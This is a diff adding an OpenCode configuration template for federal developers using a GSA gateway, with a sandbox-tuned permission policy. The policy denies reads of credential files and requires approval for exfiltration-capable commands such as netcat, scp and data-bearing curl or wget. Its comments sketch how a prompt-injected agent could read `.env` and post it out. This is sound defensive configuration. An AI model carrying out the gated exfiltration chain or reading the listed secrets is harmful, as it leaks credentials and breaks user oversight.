@@ -1,0 +1,638 @@
+{
+  // ===========================================================================
+  // OpenCode Configuration Template for Federal Government Use (GSA-TTS)
+  // ===========================================================================
+  //
+  // This template demonstrates OpenCode configuration patterns for federal
+  // government developers using the USAi LiteLLM gateway.
+  //
+  // STRUCTURE:
+  //   Active configuration (functional settings), then commented reference
+  //   examples further down.
+  //
+  // Documentation: https://opencode.ai/docs/config/
+  // Schema:        https://opencode.ai/config.json
+  //
+  // SECURITY NOTICE: The permission policy below is DEFAULT-ALLOW, tuned for use
+  // INSIDE an sbx sandbox (ephemeral container, no host FS, proxied/allow-listed
+  // network, injected credentials). It is NOT a host-safe policy. It gates only
+  // outbound "new destination" commands (git push, new remotes, scp/sftp/etc.).
+  // For stricter environments, layer a separate mixin that re-gates via a
+  // project-layer .opencode/opencode.jsonc rather than editing this file. See
+  // docs/decisions/0003-relax-permissions-for-sandbox.md.
+  // ===========================================================================
+  "$schema": "https://opencode.ai/config.json",
+
+  // usai-provider-kit:owns-opencode-config
+  // ^ Ownership marker COMMENT for the usai-provider sbx kit. It tags this file
+  // as the one the kit ships, so the startup merge step (and `scripts/verify`)
+  // can recognize the kit's own config after it is copied verbatim into the
+  // global path. It is a comment (not a JSON key) on purpose: current OpenCode
+  // validates config against a closed schema and rejects unknown top-level keys.
+  // NOTE: comments (including this one) are preserved when the kit COPIES this
+  // file into an empty global path, but are dropped when it MERGES into a
+  // pre-existing global config (JSON has no comments). See the kit README
+  // "Design: merge, don't clobber". Do not remove this comment.
+
+  // ===========================================================================
+  // PROVIDER CONFIGURATION
+  // ===========================================================================
+  // enabled_providers restricts OpenCode to specific providers only.
+  // Use this to ensure only agency-approved AI services are available.
+  // ===========================================================================
+  "enabled_providers": [
+    "usai"
+  ],
+  // Alternative: Disable specific providers while allowing others
+  // "disabled_providers": ["openai", "google"],
+  // ===========================================================================
+  // CUSTOM PROVIDER: GSA USAi Gateway
+  // ===========================================================================
+  // Custom providers use the AI SDK provider ecosystem. The npm field specifies
+  // which @ai-sdk/* package to use. For OpenAI-compatible APIs like LiteLLM,
+  // use @ai-sdk/openai-compatible.
+  //
+  // Variable substitution:
+  //   {env:VAR_NAME}  - Environment variable
+  //   {file:path}     - File contents (useful for API keys in secure files)
+  // ===========================================================================
+  "provider": {
+    "usai": {
+      "npm": "@ai-sdk/openai-compatible",
+      "name": "GSA USAI",
+      "options": {
+        "baseURL": "https://api.gsa.usai.gov/api/v1",
+        // API key from environment variable - never hardcode secrets
+        "apiKey": "{env:USAI_API_KEY}",
+        // Request timeout (10 minutes) - increase for complex reasoning tasks
+        "timeout": 600000,
+        // Timeout between streamed response chunks (2 minutes)
+        // Generous timeout for extended thinking through proxy gateways
+        "chunkTimeout": 120000,
+        // LiteLLM/proxy gateway compatibility mode.
+        // Helps with compaction failures where prior messages contain
+        // tool calls/results but the compaction request itself has no active
+        // tools attached. OpenCode injects a noop tool for strict gateways.
+        "litellmProxy": true,
+        // Custom headers for identifying agentic traffic in logs/analytics
+        "headers": {
+          "User-Agent": "OpenCode-USAI/1.0 (GSA-TTS/agentic-coding-quickstart)",
+          "X-Agent-Type": "opencode",
+          "X-Agent-Environment": "development"
+        }
+        // Additional provider options available:
+        // "setCacheKey": true  // Ensure cache key is always set for this provider
+      },
+      // =========================================================================
+      // MODEL DEFINITIONS
+      // =========================================================================
+      // Each model entry maps a model ID to its display name and token limits.
+      // The limit.context is the maximum input tokens; limit.output is max response.
+      // Run `npm run sync:usai-models` to update from USAi API + models.dev catalog.
+      // =========================================================================
+      "models": {
+        // BEGIN GENERATED USAI MODELS
+        // Anthropic Models
+        "claude_4_8_opus": {
+          "name": "Claude 4.8 Opus",
+          "limit": {
+            "context": 1000000,
+            "output": 128000
+          }
+        },
+        "claude_4_7_opus": {
+          "name": "Claude 4.7 Opus",
+          "limit": {
+            "context": 1000000,
+            "output": 128000
+          }
+        },
+        "claude_4_6_sonnet": {
+          "name": "Claude 4.6 Sonnet",
+          "limit": {
+            "context": 1000000,
+            "output": 64000
+          }
+        },
+        "claude_4_5_haiku": {
+          "name": "Claude 4.5 Haiku",
+          "limit": {
+            "context": 200000,
+            "output": 64000
+          }
+        },
+        "claude_4_5_opus": {
+          "name": "Claude 4.5 Opus",
+          "limit": {
+            "context": 200000,
+            "output": 64000
+          }
+        },
+        "claude_4_5_sonnet": {
+          "name": "Claude 4.5 Sonnet",
+          "limit": {
+            "context": 200000,
+            "output": 64000
+          }
+        },
+        "claude_3_5_haiku": {
+          "name": "Claude 3.5 Haiku",
+          "limit": {
+            "context": 200000,
+            "output": 8192
+          }
+        },
+
+        // OpenAI Models
+        "gpt-5.5-latest-guardrails-defaultv2": {
+          "name": "GPT 5.5 Latest Guardrails Defaultv2",
+          "limit": {
+            "context": 400000,
+            "output": 128000
+          }
+        },
+        "gpt-5.4-latest-guardrails-defaultv2": {
+          "name": "GPT-5.4 Latest — Guardrails Default v2",
+          "limit": {
+            "context": 1050000,
+            "output": 128000
+          }
+        },
+        "gpt-5.2-latest-guardrails-defaultv2": {
+          "name": "GPT-5.2 Latest — Guardrails Default v2",
+          "limit": {
+            "context": 400000,
+            "output": 128000
+          }
+        },
+
+        // Google Models
+        "gemini-2.5-flash": {
+          "name": "Gemini 2.5 Flash",
+          "limit": {
+            "context": 32768,
+            "output": 16384
+          }
+        },
+        "gemini-2.5-flash-lite": {
+          "name": "Gemini 2.5 Flash Lite",
+          "limit": {
+            "context": 32768,
+            "output": 16384
+          }
+        },
+        "gemini-2.5-pro": {
+          "name": "Gemini 2.5 Pro",
+          "limit": {
+            "context": 1048576,
+            "output": 65536
+          }
+        },
+
+        // Meta Models
+        "llama_4_maverick": {
+          "name": "Llama 4 Maverick",
+          "limit": {
+            "context": 1000000,
+            "output": 16384
+          }
+        },
+
+        // Cohere Models
+        "cohere_english_v3": {
+          "name": "Cohere English v3",
+          "limit": {
+            "context": 128000,
+            "output": 8192
+          }
+        }
+        // END GENERATED USAI MODELS
+      }
+    }
+  },
+  // ===========================================================================
+  // MODEL SELECTION
+  // ===========================================================================
+  "model": "usai/claude_4_8_opus",
+  "small_model": "usai/claude_4_5_haiku",
+  // ===========================================================================
+  // AGENT CONFIGURATION
+  // ===========================================================================
+  "agent": {
+    "compaction": {
+      "model": "usai/gpt-5.5-latest-guardrails-defaultv2",
+      "temperature": 0
+    },
+    "summary": {
+      "model": "usai/gpt-5.2-latest-guardrails-defaultv2",
+      "temperature": 0
+    },
+    "title": {
+      "model": "usai/gpt-5.2-latest-guardrails-defaultv2",
+      "temperature": 0
+    }
+  },
+  // ===========================================================================
+  // COMPACTION SETTINGS
+  // ===========================================================================
+  "compaction": {
+    "auto": true,
+    "prune": true,
+    "reserved": 20000
+  },
+
+  // ===========================================================================
+  // INSTRUCTIONS
+  // ===========================================================================
+  "instructions": [
+    "AGENTS.md",
+    "CLAUDE.md",
+    "CONTRIBUTING.md",
+    ".cursor/rules/*.md",
+    ".github/copilot-instructions.md"
+  ],
+  // ===========================================================================
+  // PERMISSIONS
+  // ===========================================================================
+  "permission": {
+    // -------------------------------------------------------------------------
+    // SANDBOX-TUNED, DEFAULT-ALLOW POLICY
+    //
+    // This kit is used ONLY inside an sbx sandbox: an ephemeral container with
+    // no access to the host filesystem, a proxied/allow-listed network, and
+    // INJECTED credentials (the container never holds real key material). That
+    // isolation is the security boundary. Re-gating ordinary operations here
+    // (rm, package installs, sudo, reading dotfiles, env/printenv, ...) would
+    // duplicate protections the sandbox already provides and train users to
+    // approve prompts reflexively — so the default is "allow".
+    //
+    // We gate (ask) the class the sandbox does not fully contain: commands that
+    // establish a NEW outbound destination for workspace contents, where a
+    // prompt-injected agent could exfiltrate. Network egress is already bounded
+    // by the sandbox proxy allow-list, so curl/wget are allowed for reads; the
+    // human-in-the-loop gate is reserved for git push, new git remotes, gh
+    // pr-create/api, scp/sftp/rsync/nc/telnet, and the DATA-bearing forms of
+    // curl/wget (defense-in-depth — see below). The ask list is NOT an exhaustive
+    // egress firewall (a glob cannot enumerate every exfil channel); the proxy
+    // allow-list is the real control, and the ask edges are a UX affordance for
+    // the highest-frequency, highest-consequence "new destination" actions.
+    //
+    // The read tool keeps a hard-DENY credential-file list (.env, *.pem,
+    // ~/.aws/*, kubeconfig, ...). This costs ZERO prompts (reading credentials is
+    // never the agent's job) and is the load-bearing control against a
+    // prompt-injected `read .env` -> exfil chain, since the proxy allow-list
+    // cannot distinguish benign from malicious POST bodies to an allowed host.
+    // Note: this governs the read TOOL only; bash stays default-allow (so
+    // `cat .env` is not blocked) — the deny-list is belt-and-suspenders, not a
+    // complete exfil block.
+    //
+    // SECRET-SURFACING commands (env, printenv, git remote -v, git config --get)
+    // are deliberately ALLOWED. In the sandbox these expose injected
+    // placeholders / proxied values, not real secrets — inspecting them is
+    // expected, not a leak. Credential injection is the whole point.
+    //
+    // Want a stricter posture? Do NOT fork this kit. Compose a separate mixin
+    // that contributes ask/deny rules via a project-layer
+    // <workspace>/.opencode/opencode.jsonc, which OpenCode deep-merges OVER this
+    // config. OpenCode evaluates the LAST matching rule, so a re-gating fragment
+    // that loads after this one wins. See
+    // docs/decisions/0003-relax-permissions-for-sandbox.md.
+    // -------------------------------------------------------------------------
+    "*": "allow",
+    "edit": "allow",
+    // The read tool keeps a hard-DENY credential-file list even under the
+    // otherwise default-allow posture. Rationale: it costs ZERO prompts (deny,
+    // not ask) and is the one control the proxy allow-list cannot provide — it
+    // breaks a prompt-injected `read .env` -> `curl -d @.env <allowed-host>`
+    // chain at the read step. The workspace SHOULD be a clone/worktree without
+    // real secrets, but a user may mount a repo that carries a real .env/*.pem/
+    // *.tfvars, so we keep the belt-and-suspenders. Example files are allowed
+    // LAST so they win (OpenCode evaluates the last matching rule).
+    "read": {
+      "*": "allow",
+      // Deny sensitive credential files
+      ".env": "deny",
+      ".env.*": "deny",
+      "*.env": "deny",
+      "*.env.*": "deny",
+      // Deny cryptographic key files
+      "*.pem": "deny",
+      "*.key": "deny",
+      "*.p12": "deny",
+      "*.pfx": "deny",
+      // Deny SSH keys
+      "*id_rsa*": "deny",
+      "*id_ed25519*": "deny",
+      // Deny Terraform variable files (may contain secrets)
+      "*.tfvars": "deny",
+      "*.tfvars.json": "deny",
+      // Cloud provider credentials
+      "**/.aws/*": "deny",
+      "**/.gcloud/*": "deny",
+      "**/.azure/*": "deny",
+      "**/application_default_credentials.json": "deny",
+      "*_accessKeys.csv": "deny",
+      // Kubernetes
+      "**/kubeconfig*": "deny",
+      "**/.kube/*": "deny",
+      // Package manager credentials
+      "**/.npmrc": "deny",
+      "**/.pypirc": "deny",
+      "**/pip.conf": "deny",
+      "**/.docker/config.json": "deny",
+      // HashiCorp
+      "**/.vault-token": "deny",
+      "**/*.hclic": "deny",
+      // Git credentials
+      "**/.git-credentials": "deny",
+      "**/.netrc": "deny",
+      // Ansible vaults (may contain encrypted secrets)
+      "*vault*.yml": "deny",
+      "*vault*.yaml": "deny",
+      // Generic sensitive directories
+      "**/secrets/**": "deny",
+      "**/credentials/**": "deny",
+      "**/.secrets/**": "deny",
+      // Allow example files (documentation purposes) - must come last
+      ".env.example": "allow",
+      "*.env.example": "allow",
+      "*.tfvars.example": "allow"
+    },
+    "webfetch": "allow",
+    "websearch": "allow",
+    "bash": {
+      "*": "allow",
+
+      // Outbound "new destination" edges — gated (ask) because they can push
+      // workspace contents somewhere the proxy allow-list may permit. Listed
+      // after the "*" allow so they win (OpenCode uses the last matching rule);
+      // both the bare word and the "* args" form are covered. This is a UX
+      // affordance for the highest-consequence channels, NOT an exhaustive
+      // egress firewall — see the header comment and the decision record.
+      "git push": "ask",
+      "git push *": "ask",
+      "git remote add *": "ask",
+      "git remote set-url *": "ask",
+      // gh is a first-class "new named outbound destination" sibling of git push
+      // (it POSTs workspace contents to GitHub). Gated for the same reason.
+      "gh pr create*": "ask",
+      "gh api*": "ask",
+      "scp": "ask",
+      "scp *": "ask",
+      "sftp": "ask",
+      "sftp *": "ask",
+      "rsync": "ask",
+      "rsync *": "ask",
+      "nc": "ask",
+      "nc *": "ask",
+      "ncat": "ask",
+      "ncat *": "ask",
+      "netcat": "ask",
+      "netcat *": "ask",
+      "telnet": "ask",
+      "telnet *": "ask",
+
+      // DATA-bearing curl/wget forms — gated as DEFENSE-IN-DEPTH, not a firewall.
+      // A glob cannot reliably catch every exfil form (flag order, data smuggled
+      // in a GET URL, encodings), so this is not a completeness claim; the proxy
+      // allow-list remains the real egress control. Pairs with the read-deny to
+      // raise the bar on the obvious `curl -d @secret` / upload paths. Ordered
+      // last so they win over the "*" allow. Both `curl -d ...` (flag first) and
+      // `curl <url> -d ...` (flag later) forms are covered via `*-d*` / `* -d*`.
+      "curl *-d*": "ask",
+      "curl *--data*": "ask",
+      "curl *-F*": "ask",
+      "curl *--form*": "ask",
+      "curl *-T*": "ask",
+      "curl *--upload-file*": "ask",
+      "curl *-X POST*": "ask",
+      "curl *-X PUT*": "ask",
+      "curl *--request POST*": "ask",
+      "curl *--request PUT*": "ask",
+      "wget *--post-data*": "ask",
+      "wget *--post-file*": "ask",
+      "wget *--method=POST*": "ask",
+      "wget *--body-data*": "ask",
+      "wget *--body-file*": "ask"
+    }
+  },
+  // ===========================================================================
+  // WATCHER CONFIGURATION
+  // ===========================================================================
+  "watcher": {
+    "ignore": [
+      ".git/**",
+      "node_modules/**",
+      "dist/**",
+      "build/**",
+      ".next/**",
+      ".cache/**",
+      ".venv/**",
+      "venv/**",
+      "__pycache__/**",
+      ".pytest_cache/**",
+      ".mypy_cache/**",
+      ".ruff_cache/**",
+      "coverage/**"
+    ]
+  }
+
+  // ===========================================================================
+  // ===========================================================================
+  //
+  //   REFERENCE EXAMPLES — Everything below is commented out
+  //
+  //   The following sections demonstrate available OpenCode features.
+  //   Uncomment and customize as needed for your project.
+  //
+  // ===========================================================================
+  // ===========================================================================
+
+  // ===========================================================================
+  // PROVIDER EXAMPLES
+  // ===========================================================================
+  // Example: Amazon Bedrock with AWS profile authentication
+  // "amazon-bedrock": {
+  //   "options": {
+  //     "region": "us-east-1",
+  //     "profile": "agency-profile",
+  //     "endpoint": "https://bedrock-runtime.us-east-1.vpce-xxxxx.amazonaws.com"
+  //   }
+  // }
+  //
+  // Example: Direct Anthropic API (if not using USAi gateway)
+  // "anthropic": {
+  //   "options": {
+  //     "apiKey": "{env:ANTHROPIC_API_KEY}",
+  //     "timeout": 300000
+  //   }
+  // }
+
+  // ===========================================================================
+  // MODEL OPTIONS EXAMPLES
+  // ===========================================================================
+  // Model-specific options (for models that support them):
+  // "options": {
+  //   "thinking": {
+  //     "type": "enabled",
+  //     "budgetTokens": 16000
+  //   }
+  // }
+  //
+  // Model variants for different use cases:
+  // "variants": {
+  //   "high": { "thinking": { "type": "enabled", "budgetTokens": 32000 } },
+  //   "low": { "thinking": { "type": "disabled" } }
+  // }
+  //
+  // OpenAI model options:
+  // "options": {
+  //   "reasoningEffort": "medium",
+  //   "textVerbosity": "low",
+  //   "reasoningSummary": "auto"
+  // }
+
+  // ===========================================================================
+  // AGENT EXAMPLES
+  // ===========================================================================
+  // Security Auditor Agent (Read-Only):
+  // "security-auditor": {
+  //   "description": "Security-focused code reviewer. Read-only.",
+  //   "mode": "subagent",
+  //   "model": "usai/claude_4_5_sonnet",
+  //   "temperature": 0.2,
+  //   "steps": 25,
+  //   "permission": {
+  //     "read": "allow",
+  //     "glob": "allow",
+  //     "grep": "allow",
+  //     "edit": "deny",
+  //     "bash": {
+  //       "*": "deny",
+  //       "git log *": "allow",
+  //       "git diff *": "allow",
+  //       "git show *": "allow"
+  //     },
+  //     "task": "deny",
+  //     "webfetch": "deny"
+  //   }
+  // }
+  //
+  // Documentation Writer Agent:
+  // "docs-writer": {
+  //   "description": "Technical documentation specialist. Cannot modify code.",
+  //   "mode": "subagent",
+  //   "model": "usai/claude_4_5_sonnet",
+  //   "temperature": 0.5,
+  //   "permission": {
+  //     "read": "allow",
+  //     "edit": {
+  //       "*.py": "deny",
+  //       "*.js": "deny",
+  //       "*.ts": "deny",
+  //       "*.md": "allow",
+  //       "*.mdx": "allow",
+  //       "docs/**": "allow"
+  //     },
+  //     "bash": "deny"
+  //   }
+  // }
+  //
+  // Compliance Mode (Custom Primary Agent):
+  // "compliance-mode": {
+  //   "description": "FedRAMP/FISMA compliance-focused development.",
+  //   "mode": "primary",
+  //   "model": "usai/claude_4_5_sonnet",
+  //   "temperature": 0.3,
+  //   "color": "#0050d8",
+  //   "prompt": "You are a federal compliance specialist."
+  // }
+
+  // ===========================================================================
+  // MCP SERVER EXAMPLES
+  // ===========================================================================
+  // "mcp": {
+  //   "context7": {
+  //     "type": "local",
+  //     "command": ["npx", "-y", "@upstash/context7-mcp"],
+  //     "enabled": true,
+  //     "timeout": 30000
+  //   },
+  //   "grep": {
+  //     "type": "remote",
+  //     "url": "https://grep.app/mcp",
+  //     "enabled": true,
+  //     "headers": {
+  //       "Authorization": "Bearer {env:GREP_API_KEY}"
+  //     }
+  //   },
+  //   "agency-internal": {
+  //     "type": "remote",
+  //     "url": "https://mcp.agency.gov/api/v1",
+  //     "enabled": true,
+  //     "oauth": {
+  //       "clientId": "opencode-dev-client",
+  //       "clientSecret": "{env:AGENCY_MCP_CLIENT_SECRET}",
+  //       "scope": "mcp:read mcp:tools"
+  //     }
+  //   }
+  // }
+
+  // ===========================================================================
+  // CUSTOM COMMANDS EXAMPLES
+  // ===========================================================================
+  // "command": {
+  //   "test": {
+  //     "template": "Run the full test suite with coverage.",
+  //     "description": "Run tests with coverage",
+  //     "agent": "build"
+  //   },
+  //   "review": {
+  //     "template": "Review the staged changes:\n!`git diff --staged`",
+  //     "description": "Code review staged changes",
+  //     "agent": "plan"
+  //   },
+  //   "commit": {
+  //     "template": "Generate a Conventional Commit message for:\n!`git diff --staged`",
+  //     "description": "Generate commit message"
+  //   }
+  // }
+
+  // ===========================================================================
+  // ADDITIONAL OPTIONS
+  // ===========================================================================
+  // "default_agent": "build"
+  // "share": "disabled"
+  // "autoupdate": false
+  // "snapshot": true
+  // "shell": "/bin/zsh"
+  //
+  // "server": {
+  //   "port": 4096,
+  //   "hostname": "127.0.0.1",
+  //   "mdns": false
+  // }
+  //
+  // "attachment": {
+  //   "image": {
+  //     "auto_resize": true,
+  //     "max_width": 2000,
+  //     "max_height": 2000
+  //   }
+  // }
+  //
+  // "formatter": {
+  //   "prettier": { "disabled": true }
+  // }
+  //
+  // "lsp": {
+  //   "typescript": { "disabled": false }
+  // }
+  //
+  // "experimental": {
+  //   "policies": [
+  //     { "effect": "deny", "action": "provider.use", "resource": "*" },
+  //     { "effect": "allow", "action": "provider.use", "resource": "usai" }
+  //   ]
+  // }
+}
